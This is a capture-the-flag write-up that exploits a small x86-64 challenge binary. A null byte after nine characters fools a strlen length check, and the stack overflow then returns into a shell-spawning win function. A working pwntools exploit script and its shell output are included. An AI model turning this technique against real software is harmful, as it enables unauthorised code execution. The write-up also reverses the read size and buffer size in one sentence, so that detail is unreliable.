# ramadhan-spark-ctf-2026-mini_suhour-writeup

## step 1 - identifying the binary

```bash
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/2-strlen/mini_sohour_handout]
└─$ file main 
main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cc4b943a7860efecd1649e04c51902309c557882, for GNU/Linux 3.2.0, not stripped
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/2-strlen/mini_sohour_handout]
└─$ checksec --file main  
[*] '/home/kali/Desktop/ramadhan-ctf/2-strlen/mini_sohour_handout/main'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
Our binary is 64-bit , it has no canary no pie , we can't execute shellcode on the stack and it's full relro so we can't write anywhere in the binary . It's also not stripped that means it still contains symbol tables and debugging information . 

## step 2 - running the binary 

```bash
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/2-strlen/mini_sohour_handout]
└─$ ./main
          ══════════════════════════════════
                    🌙  SOUHOUR TIME  🌙    
          ══════════════════════════════════
Build your perfect Souhour plate , but remember, the chef only measures its length.

Eat : aaa
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/2-strlen/mini_sohour_handout]
└─$ ./main
          ══════════════════════════════════
                    🌙  SOUHOUR TIME  🌙    
          ══════════════════════════════════
Build your perfect Souhour plate , but remember, the chef only measures its length.

Eat : aaaaaaaaaaaaaaaaaaaaaa
Too much food , take it easy !
```
As we can see if i exceed a certain limit of input bytes the program tell us to take it easy . that means there is somthing checking the size of the input buffer .

## step 3 - Debugging the binary 

Now we are going to debug our binary using gdb -q main (-q for less output in the intro) 
```gdb
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/2-strlen/mini_sohour_handout]
└─$ gdb -q main 
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 17.1 in 0.00ms using Python engine 3.13
Reading symbols from main...
(No debugging symbols found in main)
gef➤  info func
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  putchar@plt
0x0000000000401040  puts@plt
0x0000000000401050  strlen@plt
0x0000000000401060  system@plt
0x0000000000401070  printf@plt
0x0000000000401080  read@plt
0x0000000000401090  setvbuf@plt
0x00000000004010a0  exit@plt
0x00000000004010b0  _start
0x00000000004010e0  _dl_relocate_static_pie
0x00000000004010f0  deregister_tm_clones
0x0000000000401120  register_tm_clones
0x0000000000401160  __do_global_dtors_aux
0x0000000000401190  frame_dummy
0x0000000000401196  setup
0x00000000004011f7  win
0x000000000040121c  main
0x000000000040128c  vuln
0x00000000004012ec  _fini
gef➤  
```
As we can see we have the main function , vuln and a win function . let's disassemble our main function using disass main
```gdb
gef➤  disass main
Dump of assembler code for function main:
   0x000000000040121c <+0>:     push   rbp
   0x000000000040121d <+1>:     mov    rbp,rsp
   0x0000000000401220 <+4>:     sub    rsp,0x10
   0x0000000000401224 <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x0000000000401227 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x000000000040122b <+15>:    mov    eax,0x0
   0x0000000000401230 <+20>:    call   0x401196 <setup>
   0x0000000000401235 <+25>:    lea    rax,[rip+0xdf4]        # 0x402030
   0x000000000040123c <+32>:    mov    rdi,rax
   0x000000000040123f <+35>:    call   0x401040 <puts@plt>
   0x0000000000401244 <+40>:    lea    rax,[rip+0xe5d]        # 0x4020a8
   0x000000000040124b <+47>:    mov    rdi,rax
   0x000000000040124e <+50>:    call   0x401040 <puts@plt>
   0x0000000000401253 <+55>:    lea    rax,[rip+0xdd6]        # 0x402030
   0x000000000040125a <+62>:    mov    rdi,rax
   0x000000000040125d <+65>:    call   0x401040 <puts@plt>
   0x0000000000401262 <+70>:    lea    rax,[rip+0xe77]        # 0x4020e0
   0x0000000000401269 <+77>:    mov    rdi,rax
   0x000000000040126c <+80>:    call   0x401040 <puts@plt>
   0x0000000000401271 <+85>:    mov    edi,0xa
   0x0000000000401276 <+90>:    call   0x401030 <putchar@plt>
   0x000000000040127b <+95>:    mov    eax,0x0
   0x0000000000401280 <+100>:   call   0x40128c <vuln>   <-----
   0x0000000000401285 <+105>:   mov    eax,0x0
   0x000000000040128a <+110>:   leave
   0x000000000040128b <+111>:   ret
End of assembler dump.
```
It's calling vuln , let's see what it got 
```gdb
gef➤  disass vuln
Dump of assembler code for function vuln:
   0x000000000040128c <+0>:     push   rbp
   0x000000000040128d <+1>:     mov    rbp,rsp
   0x0000000000401290 <+4>:     sub    rsp,0x10
   0x0000000000401294 <+8>:     lea    rax,[rip+0xe99]        # 0x402134
   0x000000000040129b <+15>:    mov    rdi,rax
   0x000000000040129e <+18>:    mov    eax,0x0
   0x00000000004012a3 <+23>:    call   0x401070 <printf@plt>
   0x00000000004012a8 <+28>:    lea    rax,[rbp-0xa]
   0x00000000004012ac <+32>:    mov    edx,0xc8
   0x00000000004012b1 <+37>:    mov    rsi,rax
   0x00000000004012b4 <+40>:    mov    edi,0x0
   0x00000000004012b9 <+45>:    call   0x401080 <read@plt>
   0x00000000004012be <+50>:    lea    rax,[rbp-0xa]
   0x00000000004012c2 <+54>:    mov    rdi,rax
   0x00000000004012c5 <+57>:    call   0x401050 <strlen@plt>
   0x00000000004012ca <+62>:    cmp    rax,0xa
   0x00000000004012ce <+66>:    jbe    0x4012e9 <vuln+93>
   0x00000000004012d0 <+68>:    lea    rax,[rip+0xe69]        # 0x402140
   0x00000000004012d7 <+75>:    mov    rdi,rax
   0x00000000004012da <+78>:    call   0x401040 <puts@plt>
   0x00000000004012df <+83>:    mov    edi,0x0
   0x00000000004012e4 <+88>:    call   0x4010a0 <exit@plt>
   0x00000000004012e9 <+93>:    nop
   0x00000000004012ea <+94>:    leave
   0x00000000004012eb <+95>:    ret
End of assembler dump.
```
in this part of the vuln function
```gdb
   0x00000000004012a8 <+28>:    lea    rax,[rbp-0xa]
   0x00000000004012ac <+32>:    mov    edx,0xc8
   0x00000000004012b1 <+37>:    mov    rsi,rax
   0x00000000004012b4 <+40>:    mov    edi,0x0
   0x00000000004012b9 <+45>:    call   0x401080 <read@plt>
```
As we can see the vuln function reads 0xa bytes (10 bytes) from the user and stores it in a 0xc8 space (200 bytes) which can cause a buffer overflow .


But if we look closer in this part of the vuln function 
```gdb
   0x00000000004012be <+50>:    lea    rax,[rbp-0xa]
   0x00000000004012c2 <+54>:    mov    rdi,rax
   0x00000000004012c5 <+57>:    call   0x401050 <strlen@plt>
   0x00000000004012ca <+62>:    cmp    rax,0xa
   0x00000000004012ce <+66>:    jbe    0x4012e9 <vuln+93>
   0x00000000004012d0 <+68>:    lea    rax,[rip+0xe69]        # 0x402140
   0x00000000004012d7 <+75>:    mov    rdi,rax
   0x00000000004012da <+78>:    call   0x401040 <puts@plt>
   0x00000000004012df <+83>:    mov    edi,0x0
   0x00000000004012e4 <+88>:    call   0x4010a0 <exit@plt>
   0x00000000004012e9 <+93>:    nop
   0x00000000004012ea <+94>:    leave
   0x00000000004012eb <+95>:    ret
```
We see that the program is computing the size of out input buffer with strlen and then it compares it with 0xa (10) , and the it uses jbe (jump if below or equal) , if the size of the buffer is below or equal 10 the program jumps to vuln+93 and exit noramlly , and it it is greater than 10 it continue before to an exit call in vuln+88

Now, where is the vulnerable part in this . It's in the strlen function . See Strlen calculate the number of characters and stops when it reach a null byte '\0' . So the catch is to input 9 bytes and then we send a null byte to bypass the size check and then we can ovrwrite other things in the stack to reach the rip(instruction pointer) which points to the next instruction to be executed . 

Now let's disassemble the win function 
```gdb
gef➤  disass win
Dump of assembler code for function win:
   0x00000000004011f7 <+0>:     push   rbp
   0x00000000004011f8 <+1>:     mov    rbp,rsp
   0x00000000004011fb <+4>:     lea    rax,[rip+0xe06]        # 0x402008
   0x0000000000401202 <+11>:    mov    rdi,rax
   0x0000000000401205 <+14>:    call   0x401040 <puts@plt>
   0x000000000040120a <+19>:    lea    rax,[rip+0xe10]        # 0x402021
   0x0000000000401211 <+26>:    mov    rdi,rax
   0x0000000000401214 <+29>:    call   0x401060 <system@plt>
   0x0000000000401219 <+34>:    nop
   0x000000000040121a <+35>:    pop    rbp
   0x000000000040121b <+36>:    ret
End of assembler dump.
gef➤  x/s 0x402021
0x402021:       "/bin/sh"

```
As we can see it calls system and passes "/bin/sh" to it , so the win function spawns a shell , that makes it our goal in this challenge .


It's clear now we need to send 9 bytes + null byte + 8 bytes(to overwrite the rbp) + win function address

We are going to need ret gadgets to align the stack after overwriting the rbp , we use ropper --f main to list the gadgets in our binary .
```gdb
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/2-strlen/mini_sohour_handout]
└─$ ropper --f  main             
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

0x000000000040128a: leave; ret; 
0x00000000004011f4: nop; pop rbp; ret; 
0x00000000004012e9: nop; leave; ret; 
0x000000000040110f: nop; ret; 
0x0000000000401016: ret; <-----

102 gadgets found
```
there we have it 
```python
ret = 0x401016
win = 0x4011f7
```
## step 4 - writing the exploit

Now let's write our exploit 
```python
from pwn import*
context.terminal = ["tmux","splitw","-h"]
context.binary = elf = ELF('./main')

#p = remote("54.247.233.133",1210)
p = elf.process()


win = p64(0x4011f7)
ret = p64(0x401016)

pay = b"a"*9 + b"\x00" + b"a"*8 + ret + win

p.send(pay)
p.interactive()
```
let's run it 
```bash
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/2-strlen/mini_sohour_handout]
└─$ python3 solve.py
[*] '/home/kali/Desktop/ramadhan-ctf/2-strlen/mini_sohour_handout/main'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Starting local process '/home/kali/Desktop/ramadhan-ctf/2-strlen/mini_sohour_handout/main': pid 73652
[*] Switching to interactive mode
          ══════════════════════════════════
                    🌙  SOUHOUR TIME  🌙    
          ══════════════════════════════════
Build your perfect Souhour plate , but remember, the chef only measures its length.

Eat : time for a cup of tea ! 
$ ls
flag.txt  main  solve.py
$ cat flag.txt
Spark{n0ll_3ytes_4re_c001}
$ 
[*] Interrupted
[*] Stopped process '/home/kali/Desktop/ramadhan-ctf/2-strlen/mini_sohour_handout/main' (pid 73652)

```
final flag 
```bsah
Spark{n0ll_3ytes_4re_c001}
```

thank you for reading , i hope it was helpful


















                                                           
